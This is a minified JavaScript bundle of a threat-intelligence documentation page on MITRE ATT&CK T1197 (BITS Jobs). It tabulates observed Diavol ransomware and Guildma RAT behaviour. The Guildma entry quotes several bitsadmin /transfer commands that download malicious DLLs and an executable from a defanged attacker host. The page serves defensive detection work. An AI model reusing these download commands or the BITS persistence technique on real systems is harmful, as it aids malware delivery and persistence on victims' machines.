"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[9537],{4137:function(e,t,r){r.d(t,{Zo:function(){return m},kt:function(){return d}});var n=r(7294);function a(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function i(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function o(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?i(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):i(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function l(e,t){if(null==e)return{};var r,n,a=function(e,t){if(null==e)return{};var r,n,a={},i=Object.keys(e);for(n=0;n<i.length;n++)r=i[n],t.indexOf(r)>=0||(a[r]=e[r]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(n=0;n<i.length;n++)r=i[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var s=n.createContext({}),c=function(e){var t=n.useContext(s),r=t;return e&&(r="function"==typeof e?e(t):o(o({},t),e)),r},m=function(e){var t=c(e.components);return n.createElement(s.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},p=n.forwardRef((function(e,t){var r=e.components,a=e.mdxType,i=e.originalType,s=e.parentName,m=l(e,["components","mdxType","originalType","parentName"]),p=c(r),d=a,h=p["".concat(s,".").concat(d)]||p[d]||u[d]||i;return r?n.createElement(h,o(o({ref:t},m),{},{components:r})):n.createElement(h,o({ref:t},m))}));function d(e,t){var r=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=r.length,o=new Array(i);o[0]=p;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:a,o[1]=l;for(var c=2;c<i;c++)o[c]=r[c];return n.createElement.apply(null,o)}return n.createElement.apply(null,r)}p.displayName="MDXCreateElement"},1600:function(e,t,r){r.r(t),r.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return c},toc:function(){return m},default:function(){return p}});var n=r(7462),a=r(3366),i=(r(7294),r(4137)),o=["components"],l={},s=void 0,c={unversionedId:"Techniques/T1197 - BITS Jobs",id:"Techniques/T1197 - BITS Jobs",isDocsHomePage:!1,title:"T1197 - BITS Jobs",description:"Found 2 references across 2 AC3 Threat Sightings. Enjoy!",source:"@site/docs/05-Techniques/T1197 - BITS Jobs.md",sourceDirName:"05-Techniques",slug:"/Techniques/T1197 - BITS Jobs",permalink:"/ac3-threat-sightings/docs/Techniques/T1197 - BITS Jobs",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"T1190 - Exploit Public-Facing Application",permalink:"/ac3-threat-sightings/docs/Techniques/T1190 - Exploit Public-Facing Application"},next:{title:"T1203 - Exploitation for Client Execution",permalink:"/ac3-threat-sightings/docs/Techniques/T1203 - Exploitation for Client Execution"}},m=[{value:"From the AC3 Threat Sighting for <em>Diavol Ransomware</em>",id:"from-the-ac3-threat-sighting-for-diavol-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>Guildma RAT</em>",id:"from-the-ac3-threat-sighting-for-guildma-rat",children:[]}],u={toc:m};function p(e){var t=e.components,r=(0,a.Z)(e,o);return(0,i.kt)("wrapper",(0,n.Z)({},u,r,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"Found 2 references across 2 AC3 Threat Sightings. Enjoy!"),(0,i.kt)("h2",{id:"from-the-ac3-threat-sighting-for-diavol-ransomware"},"From the AC3 Threat Sighting for ",(0,i.kt)("em",{parentName:"h2"},"Diavol Ransomware")),(0,i.kt)("p",null,"Full details at: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Diavol_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Diavol_Ransomware.yml")),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,i.kt)("td",{parentName:"tr",align:null},"BazarLoader used ",(0,i.kt)("em",{parentName:"td"},"BITSadmin")," command-line callbacks for Persistence."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"svchost.exe")," spawned ",(0,i.kt)("em",{parentName:"td"},"RunDll32"),"."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'rundll32.exe \\"D:\\\\SharedFiles.dll\\", BasicScore'))))),(0,i.kt)("h2",{id:"from-the-ac3-threat-sighting-for-guildma-rat"},"From the AC3 Threat Sighting for ",(0,i.kt)("em",{parentName:"h2"},"Guildma RAT")),(0,i.kt)("p",null,"Full details at: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml")),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,i.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control."),(0,i.kt)("td",{parentName:"tr",align:null},"MSHTA spawned multiple instances of bitsadmin.exe to download files"),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 59697582645 /priority foreground http://weta950iitv.keorgia[.]life/?49547426338677879 "C:\\Users\\Public\\Videos\\VEO46570203888O\\log32.dll"'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 32546684239 /priority foreground http://weta950iitv.keorgia[.]life/?54819973696676725 "C:\\Users\\Public\\Videos\\VEO46570203888O\\log33.dll"'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 23219779590 /priority foreground http://weta950iitv.keorgia[.]life/?69413452047686482 "C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe"'),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 39693815612 /priority foreground http://weta950iitv.keorgia[.]life/?56006860532636958 "C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log"'))))))}p.isMDXComponent=!0}}]);